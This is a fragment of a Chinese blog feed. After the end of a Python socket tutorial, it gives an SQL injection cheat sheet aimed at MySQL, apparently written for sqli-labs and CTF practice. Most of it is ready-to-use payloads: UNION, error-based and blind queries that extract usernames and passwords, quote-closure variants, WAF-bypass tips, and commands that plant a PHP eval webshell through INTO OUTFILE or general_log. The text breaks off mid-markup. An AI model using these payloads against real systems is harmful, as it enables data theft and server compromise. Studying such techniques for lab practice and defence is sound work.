class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-comment"># 创建socket对象</span><br>s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)<br><br><br><span class="hljs-comment"># 获取本机名，设置端口号</span><br>hostname = socket.gethostname()<br>port = <span class="hljs-number">9999</span><br><br><br><span class="hljs-comment"># 连接到服务</span><br>s.bind(<br>    (hostname, <span class="hljs-number">59446</span>)<br>)<br>s.connect(<br>    (hostname, port)<br>)<br><br><br><span class="hljs-comment"># 接受消息</span><br>message = s.recv(<span class="hljs-number">1024</span>)<br>print(message.decode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure><p>可以发现自己手动绑定端口之后，端口固定不变<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/124FE048-BAFF-46AE-ABD2-4B3181C54DFF.png"></p><p>结果正如上文所说，如果不绑定端口，系统则会自动分配端口。</p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>参考教程：</p><ol><li>Python3 网络编程：<a href="https://www.runoob.com/python3/python3-socket.html">https://www.runoob.com/python3/python3-socket.html</a></li><li>网络编程socket之bind函数：<a href="https://blog.csdn.net/dongliqiang2006/article/details/5824651">https://blog.csdn.net/dongliqiang2006/article/details/5824651</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>socket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入速查手册（不定期更新）</title>
    <link href="/2021/01/18/2021%E5%B9%B41%E6%9C%8818%E6%97%A5-sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <url>/2021/01/18/2021%E5%B9%B41%E6%9C%8818%E6%97%A5-sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="1-利用方式"><a href="#1-利用方式" class="headerlink" title="1 利用方式"></a>1 利用方式</h1><h2 id="1-1-回显数据"><a href="#1-1-回显数据" class="headerlink" title="1.1 回显数据"></a>1.1 回显数据</h2><ul><li>系统信息收集：常见的使用 <code>*</code> 进行标注<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br><span class="hljs-function"><span class="hljs-title">system_user</span><span class="hljs-params">()</span></span>     系统用户名<br><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span>            MYSQL用户名 <br><span class="hljs-function"><span class="hljs-title">current_user</span><span class="hljs-params">()</span></span>    当前用户名<br><span class="hljs-function"><span class="hljs-title">session_user</span><span class="hljs-params">()</span></span>    连接数据库的用户名<br><span class="hljs-function"><span class="hljs-title">database</span><span class="hljs-params">()</span></span>        当前数据库名（*）<br><span class="hljs-function"><span class="hljs-title">schema</span><span class="hljs-params">()</span></span>          当前数据库名<br><span class="hljs-function"><span class="hljs-title">version</span><span class="hljs-params">()</span></span>         当前数据库版本信息<br>@@version         数据库版本<br><span class="hljs-function"><span class="hljs-title">load_file</span><span class="hljs-params">()</span></span>       MYSQL读取本地文件（*）<br><br>@@datadir         Location of DB files<br>@@hostname        服务器主机名<br>@@basedir         MYSQL 安装路径<br>@@version_compile_os    操作系统<br><br></code></pre></td></tr></table></figure></li><li>数据库信息收集<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment">-- 查看数据库服务器上的数据库</span><br><span class="hljs-keyword">SELECT</span> SCHEMA_NAME <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA<br><br><span class="hljs-comment">-- 查看某个数据库里面的数据表</span><br><span class="hljs-keyword">SELECT</span> table_name <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="hljs-keyword">WHERE</span> table_schema =<span class="hljs-string">&#x27;数据库名&#x27;</span><br><br><span class="hljs-comment">-- 查看某个数据表里面的字段</span><br><span class="hljs-comment">--   默认当前数据库</span><br><span class="hljs-keyword">SELECT</span> COLUMN_NAME <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="hljs-keyword">WHERE</span> table_name =<span class="hljs-string">&#x27;表名&#x27;</span><br><span class="hljs-comment">--  指定数据库</span><br><span class="hljs-keyword">SELECT</span> COLUMN_NAME <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="hljs-keyword">WHERE</span> table_name =<span class="hljs-string">&#x27;表名&#x27;</span> <span class="hljs-keyword">AND</span> table_schema =<span class="hljs-string">&#x27;数据库名&#x27;</span><br><br><span class="hljs-comment">-- 查找字段名为id的数据库名和表名</span><br><span class="hljs-keyword">SELECT</span> table_schema, table_name <span class="hljs-keyword">FROM</span> information_schema.columns <span class="hljs-keyword">WHERE</span> column_name = <span class="hljs-string">&#x27;id&#x27;</span>;<br><br><span class="hljs-comment">-- 权限列表</span><br><span class="hljs-keyword">SELECT</span> grantee, privilege_type, is_grantable <span class="hljs-keyword">FROM</span> information_schema.user_privileges;<br><br></code></pre></td></tr></table></figure></li></ul><h2 id="1-2-Getshell"><a href="#1-2-Getshell" class="headerlink" title="1.2 Getshell"></a>1.2 Getshell</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment">-- outfile获取shell（union）</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;pwd&quot;]) ?&gt;&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&#x27;可访问web路径&#x27;</span><br><br><span class="hljs-comment">-- 开启日志获取shell（堆叠）</span><br><span class="hljs-comment">-- 查看配置</span><br><span class="hljs-keyword">show</span> <span class="hljs-keyword">variables</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;general%&#x27;</span>;<br><span class="hljs-comment">-- 开启日志</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br><span class="hljs-comment">-- 设置路径</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;/Users/littlechieh6/Documents/project/sqli-labs-php7/shell.php&#x27;</span>;<br><span class="hljs-comment">-- 数据写入</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;<br><br></code></pre></td></tr></table></figure><h1 id="2-闭合方式"><a href="#2-闭合方式" class="headerlink" title="2 闭合方式"></a>2 闭合方式</h1><h2 id="2-1-常见类型"><a href="#2-1-常见类型" class="headerlink" title="2.1 常见类型"></a>2.1 常见类型</h2><p>数字、字符、括号型（单侧）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>)<br>))<br>&#x27;<br>&#x27;)<br>&#x27;))<br>&quot;<br>&quot;)<br>&quot;))<br>`<br>`)<br>`))<br><span class="hljs-meta">%</span><br><span class="hljs-meta">%</span><span class="bash">)</span><br><span class="hljs-meta">%</span><span class="bash"><span class="hljs-string">&#x27;</span></span><br><span class="hljs-meta">%</span><span class="bash"><span class="hljs-string">&#x27;)</span></span><br><span class="hljs-meta">%</span><span class="bash"><span class="hljs-string">&#x27;))</span></span><br><span class="hljs-meta">%</span><span class="bash"><span class="hljs-string">&quot;</span></span><br><span class="hljs-meta">%</span><span class="bash"><span class="hljs-string">&quot;)</span></span><br><span class="hljs-meta">%</span><span class="bash">`</span><br><span class="hljs-meta">%</span><span class="bash">`)</span><br><span class="hljs-meta">%</span><span class="bash">`))</span><br><br></code></pre></td></tr></table></figure><h2 id="2-2-两侧闭合型"><a href="#2-2-两侧闭合型" class="headerlink" title="2.2 两侧闭合型"></a>2.2 两侧闭合型</h2><p>insert无法直接回显</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">1</span>&#x27;&amp;&amp;sleep(<span class="hljs-number">3</span>)&amp;&amp;&#x27;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h2 id="2-3-Order-by型"><a href="#2-3-Order-by型" class="headerlink" title="2.3 Order by型"></a>2.3 Order by型</h2><p>验证是否存在</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment"># 升序排序</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> asc<br><span class="hljs-comment"># 降序排序</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> desc<br><br><span class="hljs-comment"># rand() 验证</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(true)<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(false)<br><br><span class="hljs-comment"># 延时验证</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>)<br>?<span class="hljs-keyword">sort</span>=(<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>))<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>)<br><br></code></pre></td></tr></table></figure><p>常见利用方式</p><ul><li>报错注入</li><li>布尔注入</li><li>延时注入<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 报错1</span><br>?sort=1+AND+(<span class="hljs-keyword">SELECT</span>+<span class="hljs-number">1</span>+<span class="hljs-keyword">FROM</span>+(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">COUNT</span>(*),<span class="hljs-keyword">CONCAT</span>((<span class="hljs-keyword">SELECT</span>(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">CONCAT</span>(<span class="hljs-keyword">CAST</span>(<span class="hljs-keyword">CONCAT</span>(username,<span class="hljs-keyword">password</span>)+<span class="hljs-keyword">AS</span>+<span class="hljs-built_in">CHAR</span>),<span class="hljs-number">0x7e</span>))+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span>+<span class="hljs-keyword">LIMIT</span>+<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-keyword">FLOOR</span>(<span class="hljs-keyword">RAND</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">GROUP</span>+<span class="hljs-keyword">BY</span>+x)a)<br><br><span class="hljs-comment"># 报错2</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(<span class="hljs-keyword">rand</span>(),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">version</span>())),<span class="hljs-number">1</span>)<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(<span class="hljs-keyword">rand</span>(),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">CONCAT_WS</span>(<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-keyword">password</span>)+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))),<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 布尔注入</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(<span class="hljs-keyword">left</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;r&#x27;</span>)<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(<span class="hljs-keyword">left</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;s&#x27;</span>)<br><br><span class="hljs-comment"># 延时注入</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substr</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">114</span>,<span class="hljs-number">1</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>)))<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substr</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>)))<br><br><span class="hljs-comment"># 写webshell</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;/var/www/html/less46.txt&quot;</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;/Users/littlechieh6/Documents/project/sqli-labs-php7/less46.php&quot;</span> <span class="hljs-keyword">lines</span> <span class="hljs-keyword">terminated</span> <span class="hljs-keyword">by</span> <span class="hljs-number">0x3c3f70687020706870696e666f28293b3f3e</span><br><br></code></pre></td></tr></table></figure></li></ul><h1 id="3-按回显类型"><a href="#3-按回显类型" class="headerlink" title="3 按回显类型"></a>3 按回显类型</h1><h2 id="3-1-联合注入"><a href="#3-1-联合注入" class="headerlink" title="3.1 联合注入"></a>3.1 联合注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment">-- 判断字段数目</span><br>order by 1<br><br><span class="hljs-comment">-- 联合查询收集信息</span><br>union <span class="hljs-keyword">select</span> <br><span class="hljs-comment">-- 查询当前数据库</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">database</span>() <br><span class="hljs-comment">-- 查询所有数据库</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata <br><span class="hljs-comment">-- 查询表名</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <br><span class="hljs-comment">-- 查询列名</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <br><span class="hljs-comment">-- 查询字段值</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <br><br></code></pre></td></tr></table></figure><h2 id="3-2-报错注入"><a href="#3-2-报错注入" class="headerlink" title="3.2 报错注入"></a>3.2 报错注入</h2><p>报错注入常见的几种类型：</p><ol><li>BIGINT等数据类型溢出</li><li>xpath语法错误</li><li>concat+rand()+group_by()导致主键重复</li><li>一些特性</li></ol><p>参考：<a href="https://xz.aliyun.com/t/253?spm=5176.12901015.0.i12901015.7bc1525cu9mqBM&accounttraceid=0e789a5d27b94462a64cd6d053faaab4tmnn">MYSQL报错注入的一点总结-先知社区</a></p><ul><li><p>数据溢出</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-keyword">select</span> ~<span class="hljs-number">0</span>+<span class="hljs-number">1</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">exp</span>(<span class="hljs-number">709</span>);<br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span>(!x-~<span class="hljs-number">0</span>)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)a);<br><br></code></pre></td></tr></table></figure></li><li><p>xpath语法错误</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);<br><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>));<br><br></code></pre></td></tr></table></figure></li></ul><h2 id="3-3-布尔注入"><a href="#3-3-布尔注入" class="headerlink" title="3.3 布尔注入"></a>3.3 布尔注入</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br><span class="hljs-number">1.</span> 获取当前数据库长度<br><span class="hljs-number">1</span>&quot; and length(database())&gt;= 11 #（）<br><br>2. 获取当前数据库名字<br>1&quot; <span class="hljs-keyword">and</span> substr(<span class="hljs-keyword">database</span>(), <span class="hljs-number">11</span>, <span class="hljs-number">1</span>)=&quot;e&quot; #<br><br><span class="hljs-number">3.</span> 获取库表的总数（还可以使用length）<br><span class="hljs-number">1</span>&quot; and (select count(table_name) from information_schema.tables where table_schema=database()) &gt;= 3 #<br><br>4. 获取库表的长度<br>1&quot; <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> length(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) &gt;=<span class="hljs-number">0</span> #<br><br><span class="hljs-number">5.</span> 获取库表的名字<br><span class="hljs-number">1</span>&quot; and substr((select table_name from information_schema.tables where table_schema=database() limit 2,1), &#123;pos&#125;, 1)=&quot;&#123;c&#125;&quot; #<br><br>6. 获取库表的字段总数<br>1&quot; <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> count(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=&quot;the_cfg&quot;) &gt;= <span class="hljs-number">2</span> #<br><br><span class="hljs-number">7.</span> 获取库表的字段第<span class="hljs-number">2</span>个长度<br><span class="hljs-number">1</span>&quot; and length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;the_cfg&quot; limit 0,1)) &gt;= 0 #<br><br>8. 获取库表的字段第N个字段名<br>1&quot; <span class="hljs-keyword">and</span> substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=&quot;the_cfg&quot; <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>), &#123;pos&#125;, <span class="hljs-number">1</span>)=&quot;&#123;c&#125;&quot; #<br><br><span class="hljs-number">9.</span> 获取内容<br><span class="hljs-number">1</span>&quot; and substr((select cfg_value from the_cfg limit 0,1), &#123;pos&#125;, 1)=&quot;&#123;c&#125;&quot; #<br>注意：substr(str,pos,len);需要注意的是：如果 pos 为 1(而不是0)，表示从第一个位置开始。<br>limit pos,len ：从 0 开始，后面的 len 代表长度<br><br></code></pre></td></tr></table></figure><h2 id="3-4-时间盲注"><a href="#3-4-时间盲注" class="headerlink" title="3.4 时间盲注"></a>3.4 时间盲注</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># SLEEP</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>);<br><span class="hljs-comment"># BENCHMARK</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">benchmark</span>(<span class="hljs-number">10000000</span>,<span class="hljs-keyword">sha</span>(<span class="hljs-number">1</span>));<br><span class="hljs-comment"># 笛卡尔积</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B, information_schema.tables C;<br><span class="hljs-comment"># GET_LOCK</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">get_lock</span>(<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-number">5</span>);<br><span class="hljs-comment"># RLIKE</span><br><span class="hljs-keyword">select</span> rpad(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">4999999</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">RLIKE</span> <span class="hljs-keyword">concat</span>(<span class="hljs-keyword">repeat</span>(<span class="hljs-string">&#x27;(a.*)+&#x27;</span>,<span class="hljs-number">30</span>),<span class="hljs-string">&#x27;b&#x27;</span>);<br><br></code></pre></td></tr></table></figure><h1 id="4-WAF绕过"><a href="#4-WAF绕过" class="headerlink" title="4 WAF绕过"></a>4 WAF绕过</h1><ol><li>双写</li><li>特殊符号:如：%0b</li><li>宽字节</li><li>两端闭合</li></ol><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>2020 年 n1ctf 中 Web-SignIn 一题中用到的 SQL 语句。使用的报错函数与 <code>exp()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 查询数据库名字</span><br>database()<br><br><span class="hljs-comment"># 查询数据库信息</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">concat</span>(<span class="hljs-keyword">version</span>(),<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x3a</span>,@@datadir,<span class="hljs-number">0x3a</span>,@@version_compile_os)<br><br><span class="hljs-comment"># 查询文件读取权限</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">user</span>,<span class="hljs-number">0x3a</span>,file_priv) <span class="hljs-keyword">from</span> mysql.user<br><br><span class="hljs-comment"># 查询当前用户</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()<br><br><span class="hljs-comment"># 查询数据库版本</span><br><span class="hljs-keyword">version</span>()<br><br><span class="hljs-comment"># 查询表名的长度</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">length</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;n1ctf_websign&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span><br><br><span class="hljs-comment"># 查询表名（修改后面的 limit）</span><br><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">DATABASE</span>() <span 